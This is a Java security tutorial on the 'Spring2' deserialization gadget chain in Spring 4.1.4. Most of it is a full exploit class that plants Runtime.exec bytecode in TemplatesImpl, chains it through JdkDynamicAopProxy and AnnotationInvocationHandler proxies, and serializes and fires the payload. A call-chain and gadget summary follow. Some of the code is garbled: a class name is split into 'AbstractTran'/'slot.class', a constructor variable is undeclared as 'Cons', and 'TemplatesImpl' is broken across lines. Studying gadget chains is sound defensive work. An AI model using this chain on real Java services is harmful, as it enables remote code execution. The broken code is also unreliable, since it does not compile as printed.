# Java Security Learning—Spring2 Chain

Author: H3rmesk1t

Data: 2022.03.12

# Environment configuration
Configure the `pom.xml` file and add the following dependencies:

```xml
<dependencies>
    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-core</artifactId>
        <version>4.1.4.RELEASE</version>
    </dependency>
    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-beans</artifactId>
        <version>4.1.4.RELEASE</version>
    </dependency>
</dependencies>
```

# Pre-knowledge
The `Spring2` chain replaces the `ObjectFactoryDelegatingInvocationHandler` of `spring-beans` on the trigger chain of the `Spring-aop`, uses `JdkDynamicAopProxy` of `spring-aop`, and completes the subsequent process of triggering `TemplatesImpl`.

## JdkDynamicAopProxy
The `org.springframework.aop.framework.JdkDynamicAopProxy` class is an implementation of the `Spring AOP` framework based on the `JDK` dynamic proxy, and it also implements the `AopProxy` interface.

Follow up on the `JdkDynamicAopProxy#invoke` method, get the `TargetSource` in `AdvisedSupport`, and call the `getTarget` method to return the object.

<div align=center><img src="./images/1.png"></div>

The `AopUtils#invokeJoinpointUsingReflection` method will reflect the method of the calling object and return it. Therefore, the `JdkDynamicAopProxy` InvocationHandler` class can complete the call to the `TemplatesImpl` object, and then directly cooperate with the trigger call chain in Spring1`.

<div align=center><img src="./images/2.png"></div>

# EXP

```java
package org.h3rmesk1t;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import jdk.internal.org.objectweb.asm.commons.AdviceAdapter;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.beans.factory.ObjectFactory;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.Base64;
import java.util.HashMap;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/12 8:38 pm
 */
public class Spring2Exploit {

    public static Field getField (final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }

    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static String serialize(Object obj) throws Exception {

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        byte[] expCode = byteArrayOutputStream.toByteArray();
        objectOutputStream.close();
        return Base64.getEncoder().encodeToString(expCode);
    }

    public static void unserialize(String expBase64) throws Exception {

        byte[] bytes = Base64.getDecoder().decode(expBase64);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }

    public static Object templatesImpl() throws Exception {

        // Generate malicious bytecodes
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\");";
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTran
slot.class));
        CtClass ctClass = classPool.makeClass("Spring1Exploit");
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
        ctClass.makeClassInitializer().insertBefore(cmd);
        byte[] ctClassBytes = ctClass.toBytecode();
        byte[][] targetByteCodes = new byte[][]{ctClassBytes};

        // Instantiate the class and set properties
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_name", "h3rmesk1t");
        setFieldValue(templatesImpl, "_bytecodes", targetByteCodes);
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        return templatesImpl;
    }

    public static void main(String[] args) throws Exception {

        // Instantiate AdvisedSupport
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templatesImpl());

        // Use AnnotationInvocationHandler to dynamic proxy
        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = aClass.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        // The invoke method of JdkDynamicAopProxy triggers the getTarget of TargetSource to return tmpl
        // And method.invoke(return value, args) will be called
        // At this time, the return value is changed to TemplatesImpl by us using dynamic proxy.
        // Next, the method needs to be newTransformer() to trigger the call chain
        Class<?> clazz = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> aopConstructor = clazz.getDeclaredConstructors()[0];
        aopConstructor.setAccessible(true);

        // Instantiate JdkDynamicAopProxy using AdvisedSupport
        InvocationHandler aopProxy = (InvocationHandler) aopConstructor.newInstance(advisedSupport);

        // JdkDynamicAopProxy itself is an InvocationHandler
        // Use it to proxy a class, so that the invoke method of JdkDynamicAopProxy will be triggered when this class is called.
        // We use it to proxy a class that is both Type and Templates(TemplatesImpl parent class)
        // In this way, this proxy class has two methods at the same time, which can be forced to be converted into the return value of TypeProvider.getType(), and can also find the newTransformer method in it.
        Type typeTemplateProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
                new Class[]{Type.class, Templates.class}, aopProxy);

        // Next, proxie the getType() method of TypeProvider, making it return the typeTemplateProxy proxy class we created
        HashMap<String, Object> hashMap = new HashMap<>();
        hashMap.put("getType", typeTemplateProxy);

        InvocationHandler newInvocationHandler = (InvocationHandler) constructor.newInstance(Target.class, hashMap);

        Class<?> typeProviderClass = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
        // Use the getType method of the AnnotationInvocationHandler to dynamically proxy the TypeProvider to return typeTemplateProxy
        Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
                new Class[]{typeProviderClass}, newInvocationHandler);

        // Initialize MethodInvokeTypeProvider
        Class<?> clazz2 = Class.forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
        Cons = clazz2.getDeclaredConstructors()[0];
        cons.setAccessible(true);
        // Since the ReflectionUtils.invokeMethod(method, provider.getType()) will be called immediately when the MethodInvokeTypeProvider is initialized
        // So when initializing, we can just write it in the method, methodName using reflection.
        Object objects = cons.newInstance(typeProviderProxy, Object.class.getMethod("toString"), 0);
        setFieldValue(objects, "methodName", "newTransformer");

        // Generate exp
        String exp = serialize(objects);
        System.out.println(exp);
        // Trigger exp
        unserialize(exp);
    }
}
```

<div align=center><img src="./images/3.png"></div>

# Call chain
```java
SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()
    SerializableTypeWrapper.TypeProvider(Proxy).getType()
	    AnnotationInvocationHandler.invoke()
		    ReflectionUtils.invokeMethod()
			    Templates(Proxy).newTransformer()
				    JdkDynamicAopProxy.invoke()
                        AopUtils.invokeJoinpointUsingReflection()
						    Tem
platesImpl.newTransformer()
```

# Summarize
## Usage Instructions
Use `JdkDynamicAopProxy` to replace `ObjectFactoryDelegatingInvocationHandler` and combine `Spring1` chain to complete the final call chain.

## Gadget
 - kick-off gadget: org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider#readObject
 - sink gadget: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer
 - chain gadget: org.springframework.aop.framework.JdkDynamicAopProxy#invoke